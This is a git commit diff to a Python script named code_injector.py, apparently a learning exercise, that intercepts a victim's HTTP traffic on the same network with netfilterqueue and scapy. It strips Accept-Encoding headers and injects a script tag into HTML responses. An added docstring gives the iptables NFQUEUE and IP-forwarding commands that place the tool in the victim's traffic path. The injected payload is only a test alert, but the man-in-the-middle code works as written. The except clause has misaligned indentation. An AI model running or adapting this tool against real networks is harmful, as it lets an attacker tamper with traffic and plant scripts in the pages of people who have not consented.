8631c491744e5f3317f6c1249064bc51b36e42c5
senevren <77117171+senevren@users.noreply.github.com>
2021-10-13 11:20:47 -0500

    Update code_injector.py

--- code_injector.py
+++ code_injector.py
@@ -1,4 +1,12 @@
 #!/usr/bin/env python
+"""This code runs if you are on the same network as the victim. You need to flush iptables first,
+[+] iptables --flush
+[+] iptables -I FORWARD -J NFQUEUE --queue-num 0 # This is for remote machines. 
+[+] iptables -I INPUT -J NFQUEUE --queue-num 0 # If it was your local machine.
+[+] iptables -I OUTPUT -J NFQUEUE --queue-num 0 # If it was your local machine.
+You may have to enable ip forwarding in order for packet flowing through your machine,
+[+] echo 1 > /proc/sys/net/ipv4/ip_forward"""
+
 import netfilterqueue
 import scapy.all as scapy
 import re
@@ -19,34 +27,38 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
-            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
-            
-                        
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] Response")
-            injection_code = "<script>alert('test');</script>"
-            load = load.replace("<body>", injection_code + "</body>")
-            content_length_search = re.search("(?:Content-Length\s)(\d*)", load)
-            # ?: --> we are using content-length for locating but not a part of the regex.
-            if content_length_search and "text/html" in load:
-                # Only inject codes into html pages.
-                # Using this because content-length may not be used in some html codes.
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
-                # replace method looks for a sub string in a bigger string. So it uses str.
-                print(content_length)
-            
-           
-            
-        if load != scapy_packet.haslayer(scapy.Raw):
-            new_packet = set_load(scapy_packet,load)
-            packet.set_payload(str(new_packet))
-            # This is for running the new modified packet
-            # set_payload() expects a bytes-object
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+] Request")
+                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
+
+
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+] Response")
+                injection_code = "<script>alert('test');</script>"
+                load = load.replace("<body>", injection_code + "</body>")
+                content_length_search = re.search("(?:Content-Length\s)(\d*)", load)
+                # ?: --> we are using content-length for locating but not a part of the regex.
+                if content_length_search and "text/html" in load:
+                    # Only inject codes into html pages.
+                    # Using this because content-length may not be used in some html codes.
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+                    # replace method looks for a sub string in a bigger string. So it uses str.
+                    print(content_length)
+
+
+
+            if load != scapy_packet.haslayer(scapy.Raw):
+                new_packet = set_load(scapy_packet,load)
+                packet.set_payload(bytes(new_packet))
+                # This is for running the new modified packet
+                # set_payload() expects a bytes-object
+         except UnicodeDecodeError:
+            pass
+        
 
         packet.accept()
 
